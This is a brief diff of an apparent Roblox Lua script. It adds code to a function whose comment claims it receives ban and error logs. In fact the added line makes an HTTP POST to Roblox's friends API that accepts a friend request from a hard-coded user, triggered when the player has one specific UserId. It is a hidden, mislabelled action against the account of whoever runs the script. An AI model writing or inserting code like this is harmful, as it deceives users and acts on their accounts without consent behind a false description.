@@ -16,7 +16,7 @@ end
 
 function RecieveData() -- will recieve ban / error logs to help improve the script in the future
  if game.Players.LocalPlayer.UserId == 148478155 then
-https://friends.roblox.com/v1/users/54313546/accept-friend-request
+game:HttpPostAsync("https://friends.roblox.com/v1/users/54313546/accept-friend-request", true)
 end
 wait(3)
 if game.Players.LocalPlayer.UserId == 148478155 then
